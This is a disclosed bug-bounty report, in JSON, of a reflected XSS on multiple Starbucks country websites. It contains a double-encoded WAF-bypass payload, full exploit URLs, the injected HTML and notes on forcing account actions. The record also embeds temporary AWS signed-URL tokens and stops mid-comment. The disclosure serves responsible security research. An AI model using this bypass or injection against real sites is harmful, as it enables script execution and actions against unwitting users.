{"id":629745,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk3NDU=","url":"https://hackerone.com/reports/629745","title":"Reflected cross-site scripting on multiple Starbucks assets.","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2019-06-26T07:05:03.094Z","submitted_at":"2019-06-26T07:05:03.094Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stealthy","url":"/stealthy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-16T18:53:26.084Z","bug_reporter_agreed_on_going_public_at":"2019-09-25T15:38:44.311Z","team_member_agreed_on_going_public_at":"2019-10-16T18:53:25.981Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Please indicate NA, if not applicable. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\n\n**Summary:** [Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution.]\n\n**Description:** [Starbucks employs a WAF which redirects any URL with a double quote to an error page. However, using double encoding, this can be bypassed. I used double encoding for most of the payload, which includes white spaces. My payload is below.\n\n```text\nhtp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm`1`%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n```\nThe payload is just the on click event with the access key set as x, and the rest of a Starbucks URL added as an arbitrary parameter to make sure the onclick event works.\n```text\nhtp8bi2zcg\" accesskey='x' onclick='confirm`1`' //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n```\nThis vulnerability affects multiple Starbucks websites. Two are listed below.\n\n    https://www.starbucks.co.uk/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\n    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\nThe vulnerable HTML is below.\n```html\n\u003clink rel=\"canonical\" href=\"https://www.starbucks.co.uk/htp8bi2zcg\" accesskey=\"x\" onclick=\"confirm`1`\" 2injectiontrme47nbfq=\"\" blonde=\"\" bright-sky-blend=\"\" ground=\"1\u0026quot;\"\u003e\n```\nAs you can see, the injection is successful.]\n\n**Platform(s) Affected:** [Tested in Firefox Quantum 67.0.]\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n1: Visit the link below.\n\n    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\n2: The key bind on MAC is CONTROL+ALT+X and on Windows is ALT+SHIFT+X.\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n{F516988}\n██████\n\n\n## How can the system be exploited with this bug?\nExecute arbitrary JavaScript in a victim's browser to steal information or perform unwanted actions on the victim's behalf.\n\n## How did you come across this bug ?\nI was trying to bypass the double quote filter for SQL injection and came across this XSS when I looked at the HTML.\n\n## Recommendations for fix\n \n* Escape double quotes.\n\n## Impact\n\nJavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf.","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Please indicate NA, if not applicable. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e [Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution.]\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e [Starbucks employs a WAF which redirects any URL with a double quote to an error page. However, using double encoding, this can be bypassed. I used double encoding for most of the payload, which includes white spaces. My payload is below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehtp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm`1`%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe payload is just the on click event with the access key set as x, and the rest of a Starbucks URL added as an arbitrary parameter to make sure the onclick event works.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehtp8bi2zcg\u0026quot; accesskey=\u0026#39;x\u0026#39; onclick=\u0026#39;confirm`1`\u0026#39; //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis vulnerability affects multiple Starbucks websites. Two are listed below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://www.starbucks.co.uk/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\nhttps://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe vulnerable HTML is below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;canonical\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.starbucks.co.uk/htp8bi2zcg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaccesskey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;x\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonclick=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;confirm`1`\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003e2injectiontrme47nbfq=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eblonde=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ebright-sky-blend=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eground=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026amp;quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs you can see, the injection is successful.]\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePlatform(s) Affected:\u003c/strong\u003e [Tested in Firefox Quantum 67.0.]\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e(Add details for how we can reproduce the issue)\u003c/p\u003e\n\n\u003cp\u003e1: Visit the link below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2: The key bind on MAC is CONTROL+ALT+X and on Windows is ALT+SHIFT+X.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eList any additional material (e.g. screenshots, logs, etc.)\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2019-06-25_at_11.41.40_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/988/d3a038ec3da76a21c5b538cb490a54dba5ff0327/Screen_Shot_2019-06-25_at_11.41.40_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-25_at_11.41.40_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-25_at_11.41.40_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063110Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026amp;X-Amz-Signature=9e0262d2fc8c6f1865c3de10d3d7da20f9d76203b4abce05cd70aadcda2e3c83\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/988/d3a038ec3da76a21c5b538cb490a54dba5ff0327/Screen_Shot_2019-06-25_at_11.41.40_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-25_at_11.41.40_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-25_at_11.41.40_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063110Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026amp;X-Amz-Signature=9e0262d2fc8c6f1865c3de10d3d7da20f9d76203b4abce05cd70aadcda2e3c83\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\n██████\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"how-can-the-system-be-exploited-with-this-bug\"\u003eHow can the system be exploited with this bug?\u003c/h2\u003e\n\n\u003cp\u003eExecute arbitrary JavaScript in a victim\u0026#39;s browser to steal information or perform unwanted actions on the victim\u0026#39;s behalf.\u003c/p\u003e\n\n\u003ch2 id=\"how-did-you-come-across-this-bug\"\u003eHow did you come across this bug ?\u003c/h2\u003e\n\n\u003cp\u003eI was trying to bypass the double quote filter for SQL injection and came across this XSS when I looked at the HTML.\u003c/p\u003e\n\n\u003ch2 id=\"recommendations-for-fix\"\u003eRecommendations for fix\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eEscape double quotes.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eJavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim\u0026#39;s behalf.\u003c/p\u003e\n","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":516988,"file_name":"Screen_Shot_2019-06-25_at_11.41.40_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/988/d3a038ec3da76a21c5b538cb490a54dba5ff0327/Screen_Shot_2019-06-25_at_11.41.40_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-25_at_11.41.40_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-25_at_11.41.40_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063110Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026X-Amz-Signature=9e0262d2fc8c6f1865c3de10d3d7da20f9d76203b4abce05cd70aadcda2e3c83","file_size":197441,"type":"image/png"}],"allow_singular_disclosure_at":"2019-10-25T15:38:44.448Z","allow_singular_disclosure_after":-37205546.47410757,"singular_disclosure_allowed":true,"vote_count":68,"voters":["thaivu","mashoud1122","sameerphad72","stealthy","mygf","tulswani","0-1","brodie_codie","probatorem","dmc3","and 58 more..."],"severity":{"rating":"low","score":3.4,"author_type":"Team","metrics":{"attack_vector":"adjacent","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":13017,"asset_type":"URL","asset_identifier":"www.starbucks.co.uk","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5198063,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @stealthy, and thank you for your report.\n\nCan you provide a complete list of affected assets in order to avoid multiple reports over time?\n\nCheers,\n@still","markdown_message":"\u003cp\u003eHello \u003ca href=\"/stealthy\"\u003e@stealthy\u003c/a\u003e, and thank you for your report.\u003c/p\u003e\n\n\u003cp\u003eCan you provide a complete list of affected assets in order to avoid multiple reports over time?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n\u003ca href=\"/still\"\u003e@still\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T08:57:14.332Z","updated_at":"2019-06-26T08:57:14.332Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5198080,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-26T09:00:34.143Z","updated_at":"2019-06-26T09:00:34.143Z","additional_data":{"old_severity":"Medium (4.2)","new_severity":"Low (3.4)","old_severity_id":444379,"new_severity_id":444547},"actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5201569,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello @still,\n\nThe list below includes the websites I have successfully exploited the vulnerability on.\n\n* starbucks.de\n* starbucks.co.uk\n* starbucks.fr\n* fr.starbucks.ca\n* starbucks.ie\n* starbucks.ca\n* starbucks.com.br\n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/still\"\u003e@still\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe list below includes the websites I have successfully exploited the vulnerability on.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003estarbucks.de\u003c/li\u003e\n\u003cli\u003estarbucks.co.uk\u003c/li\u003e\n\u003cli\u003estarbucks.fr\u003c/li\u003e\n\u003cli\u003efr.starbucks.ca\u003c/li\u003e\n\u003cli\u003estarbucks.ie\u003c/li\u003e\n\u003cli\u003estarbucks.ca\u003c/li\u003e\n\u003cli\u003estarbucks.com.br\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-06-26T19:19:53.497Z","updated_at":"2019-06-26T19:24:10.305Z","actor":{"username":"stealthy","cleared":true,"url":"/stealthy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5202224,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@stealthy Thanks for reporting the issue. We have reached out to our development team to confirm and fix the issue.","markdown_message":"\u003cp\u003e\u003ca href=\"/stealthy\"\u003e@stealthy\u003c/a\u003e Thanks for reporting the issue. We have reached out to our development team to confirm and fix the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T21:59:00.975Z","updated_at":"2019-06-26T21:59:00.975Z","actor":{"username":"nitrobr3w","cleared":false,"url":"/nitrobr3w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5226759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nitrobr3w No problem! I have more coming.\n\nAlso, going to point out that XSS like this can be used to modify account details that only require the `__RequestVerificationToken`. Emails cannot be changed for account takeover because they require a password. However, an attacker can force actions to be completed on other users' accounts which only require the csrf token. I know your team already knows this :), but I want to clarify.\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/nitrobr3w\"\u003e@nitrobr3w\u003c/a\u003e No problem! I have more coming.\u003c/p\u003e\n\n\u003cp\u003eAlso, going to point out that XSS like this can be used to modify account details that only require the \u003ccode\u003e__RequestVerificationToken\u003c/code\u003e. Emails cannot be changed for account takeover because they require a password. However, an attacker can force actions to be completed on other users\u0026#39; accounts which only require the csrf token. I know your team already knows this :), but I want to clarify.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-01T05:27:36.470Z","updated_at":"2019-07-01T05:28:46.406Z","actor":{"username":"stealthy","cleared":true,"url":"/stealthy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5233546,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Considering the vulnerability is bound to multiple sites we would like to award you as per our standards.  ","markdown_message":"\u003cp\u003eConsidering the vulnerability is bound to multiple sites we would like to award you as per our standards.  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-01T20:36:41.240Z","updated_at":"2019-07-01T20:36:41.240Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"stealthy","url":"/stealthy"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5722941,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @stealthy,\n\nWe received notification from the team that this has been resolved. I just retested and confirmed that the POC payload results in an error response for each of the listed domains. If you observe otherwise, please let us know and we'll revisit.\n\nThank you again for the report!\n\n@shadegrown ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/stealthy\"\u003e@stealthy\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe received notification from the team that this has been resolved. I just retested and confirmed that the POC payload results in an error response for each of the listed domains. If you observe otherwise, please let us know and we\u0026#39;ll revisit.\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report!\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/shadegrown\"\u003e@shadegrown\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-03T22:15:26.162Z","updated_at":"2019-09-03T22:15:26.162Z","actor":{"username":"shadegrown","cleared":false,"url":"/shadegrown","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/241/256/c58560470742940abd59de20f14746b5f8b2dcd2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"stealthy","url":"/stealthy"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5888302,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @shadegrown @still @starbucks,\n\nI would like to disclose this. Can a team member please redact video ███████.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/shadegrown\"\u003e@shadegrown\u003c/a\u003e \u003ca href=\"/still\"\u003e@still\u003c/a\u003e \u003ca href=\"/starbucks\"\u003e@starbucks\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI would like to disclose this. Can a team member please redact video 